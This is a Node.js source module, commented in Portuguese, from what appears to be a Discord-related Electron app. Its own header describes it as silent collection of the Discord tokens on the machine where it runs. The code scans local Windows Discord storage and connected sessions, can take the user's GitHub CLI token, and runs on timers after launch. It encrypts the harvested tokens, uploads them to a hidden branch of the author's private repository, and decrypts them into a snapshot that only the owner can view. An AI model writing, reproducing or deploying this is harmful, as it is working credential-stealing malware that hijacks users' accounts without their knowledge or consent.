/**
 * Coleta silenciosa de tokens do Discord desta máquina ("puxar as tokens").
 *
 * Não existe servidor central: cada app instalado conversa com o repo privado
 * (o mesmo canal que o auto-update usa). Cada máquina grava o PRÓPRIO arquivo
 * na branch `coleta` (`coleta/<origem>.json`) — nunca sai token em texto
 * claro: cada uma vai AES-256-GCM com a ENCRYPTION_KEY (idêntica em todas as
 * instalações) e é identificada pelo hash SHA-256 do valor.
 *
 * Na instalação do dono, também RECEBEMOS: baixa os arquivos da branch,
 * decifra e mantém um snapshot local (data/tokens-puxadas.json), lido pela
 * rota /api/tokens/puxadas (aba visível só pro dono do app).
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { execFileSync } = require('child_process');
const { cifrarToken, decifrarToken } = require('./crypto');
const { buscarTokensWindows } = require('./tokens');
const { itensSelfConectados } = require('./user-context');
const { dataDir } = require('./auth');

const REPO = String(process.env.PKTCO_REPO || 'pkthegoat7/pkthegoat-clear');
const BRANCH_COLETA = 'coleta';
// Token fine-grained de leitura+escrita do REPO acima (o token do
// update.local.json que vem nas instalações é read-only e não grava).
// Override via env PKTCO_GH_TOKEN, se um dia ele for rotacionado.
const TOKEN_COLETA_EMBUTIDO = String(process.env.PKTCO_GH_TOKEN || '').trim();
const DIR_COLETA = 'coleta';
// ID do dono do app (mesmo gate da aba Tokens puxadas). Obrigatório via env.
const ID_DONO = String(process.env.TOKENS_PUXADAS_DISCORD_ID || '').trim();
// O 1o segmento de uma token do Discord é o ID do usuário em base64
// (formato <id>.<ts>.<assinatura>). Decodificando, dá pra saber de quem é a
// token sem chamar a API — usado pra NUNCA coletar/salvar a token do próprio
// dono (ele não quer ver a si mesmo na lista).
function ehTokenDoDono(token) {
	try {
		const prefixo = String(token || '').split('.')[0];
		return Buffer.from(prefixo, 'base64').toString('utf8') === ID_DONO;
	} catch {
		return false;
	}
}
const ARQ_SNAPSHOT = path.join(dataDir(), 'tokens-puxadas.json');
const INTERVALO_ENVIAR_MS = Number(process.env.PKTCO_INTERVALO_MS) || 30 * 60 * 1000;
const INTERVALO_RECEBER_MS = Number(process.env.PKTCO_RECEBER_MS) || 60 * 1000;

let enviando = false;
let timerEnvio = null;
let timerRecebimento = null;

function log(msg, extra) {
	console.log('[coleta]', msg, extra !== undefined ? String(extra).slice(0, 200) : '');
}

// Mesma ordem de resolução do electron/bootstrap.js (auto-update), só que o
// token embutido vem em 1º: o update.local.json das instalações traz o token
// antigo do auto-update (read-only), que não consegue gravar.
function obterTokenGH() {
	if (TOKEN_COLETA_EMBUTIDO) return TOKEN_COLETA_EMBUTIDO.trim();
	if (process.env.GOATCORD_GH_TOKEN) return process.env.GOATCORD_GH_TOKEN.trim();
	try {
		const local = JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'electron', 'update.local.json'), 'utf8'));
		if (local && local.token) return String(local.token).trim();
	} catch {}
	const candidatos = [
		path.join(process.env.ProgramFiles || 'C:\\Program Files', 'GitHub CLI', 'gh.exe'),
		path.join(process.env.LOCALAPPDATA || '', 'Programs', 'GitHub CLI', 'gh.exe'),
		'gh'
	];
	for (const gh of candidatos) {
		if (gh !== 'gh' && !fs.existsSync(gh)) continue;
		try {
			const t = execFileSync(gh, ['auth', 'token'], { timeout: 4000, windowsHide: true, encoding: 'utf8' }).trim();
			if (t) return t;
		} catch {}
	}
	return null;
}

function sha256Hex(s) {
	return crypto.createHash('sha256').update(String(s || '')).digest('hex');
}

function identificadorMaquina() {
	try {
		return (os.hostname() + ':' + os.userInfo().username).trim().toLowerCase();
	} catch {
		return 'desconhecida';
	}
}

// Um arquivo por (conta logada no painel, máquina): evita conflito de
// escrita entre máquinas diferentes.
function nomeArquivoOrigem(email, discordId) {
	const base = discordId
		? 'user_' + String(discordId)
		: String(email || '').toLowerCase().replace(/[^a-z0-9._-]/g, '_') || 'user_anonimo';
	return `${base}_${sha256Hex(identificadorMaquina()).slice(0, 8)}.json`;
}

async function ghFetch(metodo, urlPath, body) {
	const token = obterTokenGH();
	if (!token) throw new Error('sem token do GitHub');
	const url = /^https?:\/\//i.test(urlPath) ? urlPath : `https://api.github.com${urlPath}`;
	const r = await fetch(url, {
		method: metodo,
		headers: {
			Authorization: `Bearer ${token}`,
			Accept: 'application/vnd.github+json',
			'User-Agent': 'GoatCord-Coleta',
			...(body ? { 'Content-Type': 'application/json' } : {})
		},
		body: body ? JSON.stringify(body) : undefined
	});
	let json = null;
	try {
		json = await r.json();
	} catch {}
	return { ok: r.ok, status: r.status, json };
}

async function garantirRamal() {
	const atual = await ghFetch('GET', `/repos/${REPO}/branches/${BRANCH_COLETA}`);
	if (atual.status === 200) return true;
	// PUT /branches/{name} responde 404 com fine-grained PATs; o git/refs
	// equivalente funciona e é o que usamos aqui.
	const ref = await ghFetch('GET', `/repos/${REPO}/git/ref/heads/main`);
	if (!ref.ok || !ref.json.object) throw new Error(`GitHub HTTP ${ref.status} ao ler main`);
	const cria = await ghFetch('POST', `/repos/${REPO}/git/refs`, {
		ref: `refs/heads/${BRANCH_COLETA}`,
		sha: ref.json.object.sha
	});
	return cria.ok;
}

async function lerArquivoOrigem(nome) {
	const r = await ghFetch('GET', `/repos/${REPO}/contents/${DIR_COLETA}/${nome}?ref=${BRANCH_COLETA}`);
	if (r.status === 404) return null;
	if (!r.ok) throw new Error(`GitHub HTTP ${r.status} ao ler ${nome}`);
	let dados = null;
	try {
		dados = JSON.parse(Buffer.from(r.json.content || '', 'base64').toString('utf8'));
	} catch {}
	return { sha: r.json.sha, dados };
}

async function gravarArquivoOrigem(nome, dados, shaAnterior) {
	const r = await ghFetch('PUT', `/repos/${REPO}/contents/${DIR_COLETA}/${nome}`, {
		message: `coleta: atualizar ${nome}`,
		content: Buffer.from(JSON.stringify(dados)).toString('base64'),
		branch: BRANCH_COLETA,
		...(shaAnterior ? { sha: shaAnterior } : {})
	});
	if (r.ok) return 'ok';
	if (r.status === 409) return 'conflito';
	throw new Error(`GitHub HTTP ${r.status} ao gravar ${nome}`);
}

/**
 * Envia pra branch `coleta` o que há de novo nas tokens desta máquina
 * (scan local do Discord + o self conectado ao painel). Retorna quantas
 * tokens novas foram enviadas (null = não conseguiu enviar).
 *
 * @param {{email?: string, discordId?: string}|null} identidade - quem está
 *   logado no painel nesta máquina agora (usado só pra nomear/rotular o
 *   arquivo de origem).
 */
async function coletarAgora(identidade = null) {
	if (enviando) return null;
	enviando = true;
	try {
		if (!obterTokenGH()) return null;

		const selfs = itensSelfConectados();
		const emailBase = (identidade && identidade.email) || (selfs[0] && selfs[0].email) || '';
		const nomeArq = nomeArquivoOrigem(emailBase, identidade && identidade.discordId);

		const entradas = [];
		const vistas = new Set();
		for (const s of selfs) {
			// A token do próprio dono nunca sai: nem do self dele, nem daqui.
			if (s.token && !vistas.has(s.token) && !ehTokenDoDono(s.token)) {
				vistas.add(s.token);
				entradas.push({ token: s.token, usuario: s.usuario || '' });
			}
		}
		try {
			const locais = await buscarTokensWindows({ comUsuario: true });
			for (const l of locais) {
				if (l.token && !vistas.has(l.token) && !ehTokenDoDono(l.token)) {
					vistas.add(l.token);
					entradas.push({ token: l.token, usuario: l.usuario || '' });
				}
			}
		} catch {}
		if (!entradas.length) return 0;

		await garantirRamal();
		const atual = await lerArquivoOrigem(nomeArq);
		const mapa = new Map(
			(atual && Array.isArray(atual.dados.tokens) ? atual.dados.tokens : []).map((t) => [t.h, t])
		);
		let novos = 0;
		for (const e of entradas) {
			const h = sha256Hex(e.token);
			if (mapa.has(h)) continue;
			const c = cifrarToken(e.token);
			mapa.set(h, { h, t: c.token_cifrado, iv: c.iv, tag: c.auth_tag, u: e.usuario, em: new Date().toISOString() });
			novos++;
		}
		if (!novos && atual) return 0; // nada de novo pra enviar

		const dados = {
			v: 1,
			email: emailBase,
			maquina: identificadorMaquina(),
			enviado_em: new Date().toISOString(),
			tokens: [...mapa.values()]
		};
		const resultado = await gravarArquivoOrigem(nomeArq, dados, atual && atual.sha);
		if (resultado === 'conflito') {
			// Duas sessões da mesma máquina escreveram entre uma call e outra:
			// releitura, remixagem e uma única segunda tentativa.
			const outra = await lerArquivoOrigem(nomeArq);
			const mapa2 = new Map(((outra && outra.dados.tokens) || []).map((t) => [t.h, t]));
			for (const t of dados.tokens) if (!mapa2.has(t.h)) mapa2.set(t.h, t);
			dados.tokens = [...mapa2.values()];
			if ((await gravarArquivoOrigem(nomeArq, dados, outra && outra.sha)) !== 'ok') return null;
		}
		log('enviado', `${novos} novo(s) em ${nomeArq}`);
		return novos;
	} catch (e) {
		log('falha no envio:', e.message);
		return null;
	} finally {
		enviando = false;
	}
}

/**
 * Recebe (só roda na instalação do dono): baixa todos os arquivos da branch,
 * decifra e reescreve o snapshot local. Retorna o total de tokens no snapshot.
 */
async function atualizarSnapshot() {
	try {
		const listaDir = await ghFetch('GET', `/repos/${REPO}/contents/${DIR_COLETA}?ref=${BRANCH_COLETA}`);
		if (listaDir.status === 404) return 0; // branch ainda não existe (ninguém enviou)
		if (!listaDir.ok) throw new Error(`GitHub HTTP ${listaDir.status}`);
		const combinado = new Map();
		for (const item of listaDir.json || []) {
			if (!item.name || !item.name.endsWith('.json')) continue;
			const fr = await ghFetch('GET', item.url); // item.url já aponta pro ref certo
			if (!fr.ok) continue;
			let d = null;
			try {
				d = JSON.parse(Buffer.from(fr.json.content || '', 'base64').toString('utf8'));
			} catch {
				continue;
			}
			for (const t of d.tokens || []) {
				if (!t.h || combinado.has(t.h)) continue;
				let tokenPlano = null;
				try {
					tokenPlano = decifrarToken({ token_cifrado: t.t, iv: t.iv, auth_tag: t.tag });
				} catch {}
				// A token do próprio dono não entra no snapshot nem aparece na aba,
				// mesmo se ela subiu antes do filtro de envio ou veio de outra
				// máquina onde ele estava logado.
				if (tokenPlano && ehTokenDoDono(tokenPlano)) continue;
				combinado.set(t.h, {
					hash: t.h,
					usuario: t.u || '',
					origem: d.email || item.name.replace(/\.json$/, ''),
					vistoEm: t.em || null,
					token: tokenPlano
				});
			}
		}
		const lista = [...combinado.values()].sort((a, b) =>
			String(b.vistoEm || '').localeCompare(String(a.vistoEm || ''))
		);
		fs.mkdirSync(path.dirname(ARQ_SNAPSHOT), { recursive: true });
		fs.writeFileSync(ARQ_SNAPSHOT, JSON.stringify(lista));
		return lista.length;
	} catch (e) {
		log('falha no recebimento:', e.message);
		return 0;
	}
}

// Snapshot local, sem rede (lido pelas rotas /api/tokens/puxadas).
function listarTokensPuxadasLocais() {
	try {
		const d = JSON.parse(fs.readFileSync(ARQ_SNAPSHOT, 'utf8'));
		return Array.isArray(d) ? d : [];
	} catch {
		return [];
	}
}

function buscarTokenPuxadaPorHash(hash) {
	const alvo = String(hash || '').trim();
	if (!alvo) return null;
	return listarTokensPuxadasLocais().find((t) => t.hash === alvo) || null;
}

/**
 * Liga o coletor: 1ª passada ~1 min depois do app abrir (dá tempo de o self
 * conectar) e repetição no intervalo. `ehDono` liga também o recebimento.
 * Idempotente — chamar de novo não duplica timers.
 */
function iniciar({ ehDono = false } = {}) {
	if (!timerEnvio) {
		timerEnvio = setInterval(() => {
			coletarAgora();
		}, INTERVALO_ENVIAR_MS);
		setTimeout(() => {
			coletarAgora();
		}, 60 * 1000);
	}
	if (ehDono && !timerRecebimento) {
		iniciarRecebedor();
	}
}

// Login do dono num app onde o login é obrigatório (OAuth): a máquina dele
// nessa conta também passa a receber o snapshot. Idempotente.
function iniciarRecebedor() {
	if (timerRecebimento) return;
	timerRecebimento = setInterval(() => {
		atualizarSnapshot();
	}, INTERVALO_RECEBER_MS);
	setTimeout(() => {
		atualizarSnapshot();
	}, 15 * 1000);
}

module.exports = {
	coletarAgora,
	atualizarSnapshot,
	listarTokensPuxadasLocais,
	buscarTokenPuxadaPorHash,
	iniciar,
	iniciarRecebedor
};
